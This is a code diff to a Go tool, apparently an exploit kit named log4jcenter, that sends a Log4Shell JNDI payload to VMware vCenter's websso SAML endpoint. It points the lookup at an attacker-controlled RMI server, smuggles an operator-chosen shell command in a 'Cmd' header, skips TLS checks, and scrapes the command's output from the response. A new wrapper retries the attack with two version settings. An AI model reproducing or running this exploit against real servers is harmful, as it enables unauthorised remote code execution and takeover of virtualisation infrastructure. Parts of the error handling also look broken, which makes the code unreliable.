@@ -1,12 +1,16 @@
 package log4jcenter
 
 import (
+	"crypto/tls"
 	"fmt"
+	"io"
 	"net"
 	"os"
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/go-resty/resty/v2"
 
 	"github.com/imroc/req/v3"
 )
@@ -127,12 +131,15 @@ func exploit(url, rmiserver string) {
 
 }
 
-func Exec_cmd(url, rmiserver, command, version string) bool {
+func exec_cmd(url, rmiserver, command, version string) (bool, string) {
 	host := rmiserver
 	client := req.C()
 	client.EnableForceHTTP1()
+	// client.DisableAutoReadResponse()
+	// client.SetUnixSocket("1.sock")
 	client.EnableInsecureSkipVerify()
-	client.SetTimeout(2 * time.Second)
+	client.DisableAutoReadResponse()
+	client.SetTimeout(4 * time.Second)
 	// client.SetProxyURL("http://127.0.0.1:8080") //尽量别用burp做代理，burp2022.8会启用http2，导致vcenter报错403
 	rmi_server := ""
 	cmd := ""
@@ -143,7 +150,7 @@ func Exec_cmd(url, rmiserver, command, version string) bool {
 		rmi_server = fmt.Sprintf("${jndi:%s/TomcatBypass/TomcatEcho}", host)
 		cmd = command + ";echo 'nmsl'"
 	}
-
+	_ = cmd
 	myheader := map[string]string{
 		"User-Agent":                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
 		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -157,30 +164,54 @@ func Exec_cmd(url, rmiserver, command, version string) bool {
 		"Cmd":                       cmd,
 	}
 
-	resp, err := client.R().
+	cli := resty.New().SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
+
+	resp, err := cli.R().
+		EnableTrace().
 		SetHeaders(myheader).
 		Get(url + "/websso/SAML2/SSO/vsphere.local?SAMLRequest=")
-	if err != nil && strings.Contains(err.Error(), "EOF") {
+	_ = err
+	// fmt.Println(resp.String())
+
+	// resp, err := client.R().
+	// 	SetHeaders(myheader).
+	// 	Get(url + "/websso/SAML2/SSO/vsphere.local?SAMLRequest=")
+	if err != nil && err == io.ErrUnexpectedEOF {
 		//
-	} else if err == nil {
-
-		// log.Fatal(err)
-
+	} else if strings.Contains(err.Error(), "NO_ERROR") {
+		//
 	} else {
 		fmt.Println("[-] 连接失败，请检查网络.")
 		os.Exit(0)
 	}
-	if resp.StatusCode == 200 {
+	if resp.StatusCode() == 200 {
 		result := resp.String()
 		result = strings.Split(result, "nmsl")[0]
 		result = strings.TrimRight(result, "\n")
-		fmt.Println(result)
-		return true
+		// fmt.Println(resp.String())
+		// fmt.Println(result)
+		// fmt.Println(1)
+		return true, result
 	} else {
 
-		return false
+		return false, ""
 	}
 
+}
+
+func Execc(url, rmiserver, command string) {
+	for i := 0; i < 5; i++ {
+		temp1, temp2 := exec_cmd(url, rmiserver, command, "7")
+		if temp1 {
+			fmt.Println(temp2)
+			break
+		}
+		temp3, temp4 := exec_cmd(url, rmiserver, command, "6")
+		if temp3 {
+			fmt.Println(temp4)
+			break
+		}
+	}
 }
 
 func getIpAddr2(url string) string {
